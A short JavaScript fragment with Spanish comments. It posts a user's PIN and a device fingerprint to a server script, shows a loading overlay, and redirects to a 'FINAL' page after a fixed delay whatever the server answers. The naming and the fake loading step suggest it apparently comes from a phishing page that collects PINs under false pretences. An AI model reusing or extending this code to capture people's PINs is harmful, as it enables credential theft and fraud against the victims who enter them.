function pasousuario(p){
    var d = detectar_dispositivo();
    $("#fondo, #cargando-o").show();
    
    // Enviamos el PIN y el dispositivo
    $.post("../process/paso_pin.php", { pin: p, dis: d }, function(data) {
        // Si el servidor responde OK, podemos acelerar el salto
    });
    
    // Salto automático a la siguiente pantalla de cara al usuario
    setTimeout(function(){ 
        window.location.href = "FINAL.php"; 
    }, 2500);
}
